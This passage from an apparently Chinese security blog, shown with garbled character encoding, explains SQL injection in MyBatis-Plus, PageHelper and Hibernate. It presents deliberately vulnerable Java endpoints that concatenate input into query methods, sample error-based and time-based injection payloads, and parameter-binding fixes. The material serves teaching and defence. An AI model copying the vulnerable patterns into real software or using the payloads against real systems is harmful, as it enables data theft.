start="2"><li>åˆ—çš„åºå·(sqlæ³¨å…¥ä¸­å¸¸ç”¨äºåˆ¤æ–­åˆ—æ•°)</li></ol><ul><li><p>å¯ä»¥ä½¿ç”¨ SELECT å­å¥ä¸­åˆ—çš„åºå·ï¼ˆä» 1 å¼€å§‹ï¼‰ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">2</span>; <span class="hljs-comment">-- æŒ‰ç¬¬äºŒåˆ— age æ’åº</span><br></code></pre></td></tr></table></figure></li></ul><ol start="3"><li>æ’åºæ–¹å¼</li></ol><ul><li><p>é»˜è®¤æ˜¯å‡åºï¼ˆ<code>ASC</code>ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¾å¼æŒ‡å®šã€‚</p></li><li><p>é™åºä½¿ç”¨ <code>DESC</code>ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure><p> 4.å¤šä¸ªæ’åºæ¡ä»¶</p></li><li><p>å¯ä»¥æŒ‡å®šå¤šä¸ªåˆ—ï¼ŒæŒ‰ä¼˜å…ˆçº§ä¾æ¬¡æ’åºã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age, grade <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade <span class="hljs-keyword">DESC</span>, age <span class="hljs-keyword">ASC</span>;<br></code></pre></td></tr></table></figure></li></ul><ol start="5"><li>è¡¨è¾¾å¼æˆ–è®¡ç®—ç»“æœ</li></ol><ul><li><p>å¯ä»¥ä½¿ç”¨è¡¨è¾¾å¼æˆ–è®¡ç®—ç»“æœè¿›è¡Œæ’åºã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, salary, bonus <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> (salary <span class="hljs-operator">+</span> bonus) <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure></li></ul><ol start="6"><li>NULL å€¼æ’åº</li></ol><ul><li><p>ä¸åŒæ•°æ®åº“å¯¹ </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure><p> çš„æ’åºå¤„ç†å¯èƒ½ä¸åŒï¼š</p><ul><li>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ<code>NULL</code> åœ¨å‡åºä¸­æ’åœ¨æœ€å‰ï¼Œåœ¨é™åºä¸­æ’åœ¨æœ€åã€‚</li><li>å¯ä»¥ä½¿ç”¨ <code>NULLS FIRST</code> æˆ– <code>NULLS LAST</code> æ˜ç¡®æŒ‡å®šã€‚</li></ul></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age <span class="hljs-keyword">ASC</span> <span class="hljs-keyword">NULLS LAST</span>;<br></code></pre></td></tr></table></figure></li></ul><p>æ³¨æ„äº‹é¡¹ï¼š</p><ul><li>åˆ—å¿…é¡»å­˜åœ¨ï¼š<code>ORDER BY</code> ä¸­å¼•ç”¨çš„åˆ—æˆ–åˆ«åå¿…é¡»åœ¨æŸ¥è¯¢ç»“æœä¸­æœ‰æ•ˆã€‚</li><li>æ€§èƒ½å½±å“ï¼šæ’åºæ“ä½œå¯èƒ½ä¼šå½±å“æŸ¥è¯¢æ€§èƒ½ï¼Œå°¤å…¶æ˜¯å¤§æ•°æ®é›†æ—¶ã€‚</li></ul><p>å¹¶ä¸”order byè¯­å¥åæ— æ³•æ‹¼æ¥å˜é‡ï¼Œä½†æ˜¯å¯ä»¥æ‹¼æ¥sqlè¯­å¥ï¼Œå¦‚æœä¸‡èƒ½å¯†ç èƒ½å¤Ÿä½¿ç”¨ï¼ŒçŒœæµ‹æ˜¯è¢«å½“ä½œsqlè¯­å¥æ‰§è¡Œ</p><h3 id="exists-notExists-æ‹¼æ¥äº§ç”Ÿçš„SQL-æ³¨å…¥"><a href="#exists-notExists-æ‹¼æ¥äº§ç”Ÿçš„SQL-æ³¨å…¥" class="headerlink" title="exists&#x2F;notExists æ‹¼æ¥äº§ç”Ÿçš„SQL æ³¨å…¥"></a>exists&#x2F;notExists æ‹¼æ¥äº§ç”Ÿçš„SQL æ³¨å…¥</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln04&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln04</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.exists(<span class="hljs-string">&quot;select * from employees where id = &quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="having-è¯­å¥"><a href="#having-è¯­å¥" class="headerlink" title="having è¯­å¥"></a>having è¯­å¥</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln06&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln06</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().groupBy(<span class="hljs-string">&quot;id&quot;</span>).having(<span class="hljs-string">&quot;id &gt;&quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="order-by-è¯­å¥-å†™order-by-çš„æ—¶å€™ä¸èƒ½é¢„ç¼–è¯‘ï¼Œä¸‹é¢æœ‰ä¸€ä¸ªæ¨¡å—è¯¦ç»†è®²è§£"><a href="#order-by-è¯­å¥-å†™order-by-çš„æ—¶å€™ä¸èƒ½é¢„ç¼–è¯‘ï¼Œä¸‹é¢æœ‰ä¸€ä¸ªæ¨¡å—è¯¦ç»†è®²è§£" class="headerlink" title="order by è¯­å¥(å†™order by çš„æ—¶å€™ä¸èƒ½é¢„ç¼–è¯‘ï¼Œä¸‹é¢æœ‰ä¸€ä¸ªæ¨¡å—è¯¦ç»†è®²è§£)"></a>order by è¯­å¥(å†™order by çš„æ—¶å€™ä¸èƒ½é¢„ç¼–è¯‘ï¼Œä¸‹é¢æœ‰ä¸€ä¸ªæ¨¡å—è¯¦ç»†è®²è§£)</h3><p>ç›¸å…³æ¥å£å†™æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby01</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderBy(<span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>, id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/orderby02&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby02</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderByAsc(id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/orderby03&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby03</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderByDesc(id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="group-By-order-by"><a href="#group-By-order-by" class="headerlink" title="group By&#x2F;order by"></a>group By&#x2F;order by</h3><h3 id="inSql-notInSql"><a href="#inSql-notInSql" class="headerlink" title="inSql&#x2F;notInSql"></a>inSql&#x2F;notInSql</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/insql&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">inSql</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().inSql(id, <span class="hljs-string">&quot;select * from employees where id &gt;&quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™å‡ ç§æ–¹æ³•éƒ½æ˜¯ä¸æ”¯æŒé¢„ç¼–è¯‘ç»‘å®šå‚æ•°ï¼Œä¼šç›´æ¥å°†å­—ç¬¦ä¸²æ‹¼æ¥åˆ°æœ€ç»ˆ SQL æœ«å°¾**ï¼Œ**ä¸ä¼šåšä»»ä½•å‚æ•°ç»‘å®šæˆ–è½¬ä¹‰å¤„ç†ã€‚å¯¼è‡´æ”»å‡»è€…ä¼ å…¥æ¶æ„ä»£ç é€ æˆè¯­å¥æ‹¼æ¥ï¼Œç”¨æˆ·ä¿¡æ¯æ³„éœ²ã€‚</p><h3 id="åˆ†é¡µæ’ä»¶çš„-SQL-æ³¨å…¥æƒ…å†µ"><a href="#åˆ†é¡µæ’ä»¶çš„-SQL-æ³¨å…¥æƒ…å†µ" class="headerlink" title="åˆ†é¡µæ’ä»¶çš„ SQL æ³¨å…¥æƒ…å†µ"></a>åˆ†é¡µæ’ä»¶çš„ SQL æ³¨å…¥æƒ…å†µ</h3><h4 id="åˆ†é¡µæ’ä»¶è‡ªå¸¦çš„-addOrder-æ–¹æ³•"><a href="#åˆ†é¡µæ’ä»¶è‡ªå¸¦çš„-addOrder-æ–¹æ³•" class="headerlink" title="åˆ†é¡µæ’ä»¶è‡ªå¸¦çš„ addOrder() æ–¹æ³•"></a>åˆ†é¡µæ’ä»¶è‡ªå¸¦çš„ <code>addOrder()</code> æ–¹æ³•</h4><ul><li><p>é…ç½®åˆ†é¡µæ’ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.drunkbaby.config;  <br>  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.annotation.DbType;  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;  <br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;  <br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;  <br>  <br><span class="hljs-meta">@Configuration</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> &#123;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * æ³¨å†Œæ’ä»¶  </span><br><span class="hljs-comment"> */</span>  <br> <span class="hljs-meta">@Bean</span>  <br> <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> &#123;  <br>  <br>        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();  <br> <span class="hljs-comment">// æ·»åŠ åˆ†é¡µæ’ä»¶  </span><br> <span class="hljs-type">PaginationInnerInterceptor</span> <span class="hljs-variable">pageInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>();  <br> <span class="hljs-comment">// è®¾ç½®è¯·æ±‚çš„é¡µé¢å¤§äºæœ€å¤§é¡µåæ“ä½œï¼Œtrueè°ƒå›åˆ°é¦–é¡µï¼Œfalseç»§ç»­è¯·æ±‚ã€‚é»˜è®¤false  </span><br> pageInterceptor.setOverflow(<span class="hljs-literal">false</span>);  <br> <span class="hljs-comment">// å•é¡µåˆ†é¡µæ¡æ•°é™åˆ¶ï¼Œé»˜è®¤æ— é™åˆ¶  </span><br> pageInterceptor.setMaxLimit(<span class="hljs-number">500L</span>);  <br> <span class="hljs-comment">// è®¾ç½®æ•°æ®åº“ç±»å‹  </span><br> pageInterceptor.setDbType(DbType.MYSQL);  <br>  <br> interceptor.addInnerInterceptor(pageInterceptor);  <br> <span class="hljs-keyword">return</span> interceptor;  <br> &#125;    <br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¼æ´æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/PageVul01&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title function_">mybatisPlusPageVuln01</span><span class="hljs-params">(Long page, Long size, String id)</span>&#123;  <br>    QueryWrapper&lt;Person&gt; queryWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> Page&lt;Person&gt; personPage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);  <br> personPage.addOrder(OrderItem.asc(id));  <br> IPage&lt;Person&gt; iPage= personMapper.selectPage(personPage, queryWrapper);  <br> List&lt;Person&gt; people = iPage.getRecords();  <br> <span class="hljs-keyword">return</span> people;  <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>Page&lt;Person&gt; personPage = new Page&lt;&gt;(1,2);</code> çš„å‚æ•°ç”±è‡ªå·±å®šä¹‰</p><p>è¿™é‡Œå¯¹åº”çš„ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=1%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e)))<br><br>// æˆ–è€…æ˜¯<br>?id=1&#x27; and sleep(5)<br></code></pre></td></tr></table></figure><p>å¿…é¡»æ˜¯é€šè¿‡ç›²æ³¨çš„å½¢å¼ï¼Œå¦‚æœæ˜¯æ™®é€šçš„æ³¨å…¥ï¼Œæ˜¯ä¸ä¼šæœ‰å›æ˜¾çš„ï¼›å› ä¸ºè¿™é‡Œåˆ†é¡µæŸ¥æ‰¾ï¼Œsize å°±æŠŠä½ çš„æ•°æ®æ•°é‡é™å®šæ­»äº†ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ•°æ®å°±ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥åªèƒ½ç›²æ³¨ã€‚</p></li></ul><h4 id="pagehelper"><a href="#pagehelper" class="headerlink" title="pagehelper"></a>pagehelper</h4><p>è¿™é‡Œçš„åŸç†å°±å’Œ order by ä¸€æ ·ï¼Œä¸èµ˜è¿°äº†</p><p>å› ä¸ºOrder byæ’åºæ—¶ä¸èƒ½è¿›è¡Œé¢„ç¼–è¯‘å¤„ç†ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨æ’ä»¶æ—¶éœ€è¦é¢å¤–æ³¨æ„å¦‚ä¸‹functionï¼ŒåŒæ ·ä¼šå­˜åœ¨SQLæ³¨å…¥é£é™©ï¼š</p><ul><li>com.github.pagehelper.Page<ul><li>ä¸»è¦æ˜¯setOrderBy(java.lang.String)æ–¹æ³•</li></ul></li><li>com.github.pagehelper.page.PageMethod<ul><li>ä¸»è¦æ˜¯startPage(int,int,java.lang.String)æ–¹æ³•</li></ul></li><li>com.github.pagehelper.PageHelper<ul><li>ä¸»è¦æ˜¯startPage(int,int,java.lang.String)æ–¹æ³•</li></ul></li></ul><h2 id="mybatis-Plus-SQL-æ³¨å…¥çš„ä¿®å¤"><a href="#mybatis-Plus-SQL-æ³¨å…¥çš„ä¿®å¤" class="headerlink" title="mybatis Plus SQL æ³¨å…¥çš„ä¿®å¤"></a>mybatis Plus SQL æ³¨å…¥çš„ä¿®å¤</h2><p>ä»¥ä¸Šåˆ—å‡ºçš„æ‰€æœ‰æ–¹æ³•ï¼Œé™¤äº†applyæ–¹æ³•å¯ä»¥ä½¿ç”¨å‚æ•°å ä½ç¬¦è¿›è¡Œé˜²æŠ¤ï¼Œå…¶ä»–æ–¹æ³•å…¨éƒ¨ä¸æ”¯æŒé¢„ç¼–è¯‘ç»‘å®šå‚æ•°ï¼Œä¼šç›´æ¥å°†å­—ç¬¦ä¸²æ‹¼æ¥åˆ°æœ€ç»ˆ SQL æœ«å°¾**ï¼Œ**ä¸ä¼šåšä»»ä½•å‚æ•°ç»‘å®šæˆ–è½¬ä¹‰å¤„ç†ã€‚å¯¼è‡´æ”»å‡»è€…ä¼ å…¥æ¶æ„ä»£ç é€ æˆè¯­å¥æ‹¼æ¥ï¼Œç”¨æˆ·ä¿¡æ¯æ³„éœ²ã€‚</p><p>èƒ½æƒ³åˆ°çš„é˜²æŠ¤æ–¹æ³•åªæœ‰å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œæ£€æµ‹å’Œè¿‡æ»¤</p><p>è¿˜æœ‰å†™Filterè¿›è¡Œè¿‡æ»¤</p><p>è¿‡æ»¤å™¨é›†æˆï¼š<a href="https://github.com/Drun1baby/AWD-AWDP_SecFilters">Drun1baby&#x2F;AWD-AWDP_SecFilters: ä¸ºäº†å‡†å¤‡ AWDï¼Œå†™äº†ä¸ª Filter çš„é›†åˆ (github.com)</a></p><h2 id="Hibernateæ¡†æ¶ä¸‹çš„SQLæ³¨å…¥"><a href="#Hibernateæ¡†æ¶ä¸‹çš„SQLæ³¨å…¥" class="headerlink" title="Hibernateæ¡†æ¶ä¸‹çš„SQLæ³¨å…¥"></a>Hibernateæ¡†æ¶ä¸‹çš„SQLæ³¨å…¥</h2><p> Hibernateæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„å¯¹è±¡å…³ç³»æ˜ å°„æ¡†æ¶ï¼Œå®ƒå¯¹JDBCè¿›è¡Œäº†éå¸¸è½»é‡çº§çš„å¯¹è±¡å°è£…ï¼Œä½¿å¾—Javaç¨‹åºå‘˜å¯ä»¥éšå¿ƒæ‰€æ¬²çš„ä½¿ç”¨å¯¹è±¡ç¼–ç¨‹æ€ç»´æ¥æ“çºµæ•°æ®åº“ã€‚</p><p>ä¸€èˆ¬æ˜¯é»˜è®¤è¿›è¡Œé¢„ç¼–è¯‘çš„</p><p>Hibernateå¯ä»¥ä½¿ç”¨hqlæ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œæ— è®ºæ˜¯å“ªç§æ–¹å¼éƒ½æœ‰å¯èƒ½å¯¼è‡´SQLæ³¨å…¥</p><h3 id="HQL"><a href="#HQL" class="headerlink" title="HQL"></a>HQL</h3><p>hqlè¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hql">String hql = &quot;from People where username = &#x27;&quot; + username + &quot;&#x27; and password = &#x27;&quot; + password + &quot;&#x27;&quot;;<br></code></pre></td></tr></table></figure><p>è¿™ç§æ‹¼æ¥æ–¹å¼å­˜åœ¨SQLæ³¨å…¥</p><p>æ­£ç¡®ä½¿ç”¨ä»¥ä¸‹å‡ ç§HQLå‚æ•°ç»‘å®šçš„æ–¹å¼å¯ä»¥æœ‰æ•ˆé¿å…æ³¨å…¥çš„äº§ç”Ÿï¼š</p><p>1.å‘½åå‚æ•°ï¼ˆnamed parameterï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = ?1&quot;</span>, User.class);<br><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = :name&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-string">&quot;name&quot;</span>, parameter);<br></code></pre></td></tr></table></figure><p>2.ä½ç½®å‚æ•°ï¼ˆPositional parameterï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = ?1&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-number">1</span>, parameter);<br></code></pre></td></tr></table></figure><p>3.å‘½åå‚æ•°åˆ—è¡¨ï¼ˆnamed parameter listï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;String&gt; names = Arrays.asList(<span class="hljs-string">&quot;g1ts&quot;</span>, <span class="hljs-string">&quot;g2ts&quot;</span>);<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users where name in (:names)&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-string">&quot;names&quot;</span>, names);<br></code></pre></td></tr></table></figure><p>4.ç±»å®ä¾‹ï¼ˆJavaBeanï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">user1.setName(<span class="hljs-string">&quot;g1ts&quot;</span>);<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users where name =:name&quot;</span>, User.class);<br>query.setProperties(user1);<br></code></pre></td></tr></table></figure><p>5.HQLæ‹¼æ¥æ–¹æ³•</p><p> è¿™ç§æ–¹å¼æ˜¯æœ€å¸¸ç”¨ï¼Œè€Œä¸”å®¹æ˜“å¿½è§†ä¸”å®¹æ˜“è¢«æ³¨å…¥çš„ï¼Œé€šå¸¸åšæ³•å°±æ˜¯å¯¹å‚æ•°çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œæ¨èå¤§å®¶ä½¿ç”¨ Springå·¥å…·åŒ…çš„StringEscapeUtils.escapeSql()æ–¹æ³•å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.lang.StringEscapeUtils;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> StringEscapeUtils.escapeSql(<span class="hljs-string">&quot;&#x27;&quot;</span>);<br>  System.out.println(str);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>Hibernateæ”¯æŒä½¿ç”¨åŸç”ŸSQLè¯­å¥æ‰§è¡Œï¼Œæ‰€ä»¥å…¶é£é™©å’ŒJDBCæ˜¯ä¸€è‡´çš„ï¼Œç›´æ¥ä½¿ç”¨æ‹¼æ¥çš„æ–¹æ³•æ—¶ä¼šå¯¼è‡´SQLæ³¨å…¥</p><p>è¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Query&lt;People&gt; query = session.createNativeQuery(<span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p>æ­£ç¡®å†™æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createNativeQuery(<span class="hljs-string">&quot;select * from user where name = :name&quot;</span>);<br>query.setParameter(<span class="hljs-string">&quot;name&quot;</span>,parameter);<br></code></pre></td></tr></table></figure><h2 id="é¢„ç¼–è¯‘ä¸‹çš„sqlæ³¨å…¥"><a href="#é¢„ç¼–è¯‘ä¸‹çš„sqlæ³¨å…¥" class="headerlink" title="é¢„ç¼–è¯‘ä¸‹çš„sqlæ³¨å…¥"></a>é¢„ç¼–è¯‘ä¸‹çš„sqlæ³¨å…¥</h2><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>é¢„ç¼–è¯‘æ˜¯å°†sqlè¯­å¥å‚æ•°åŒ–ï¼Œå¯é¢„ç¼–è¯‘çš„è¯­å¥ï¼Œå¦‚ 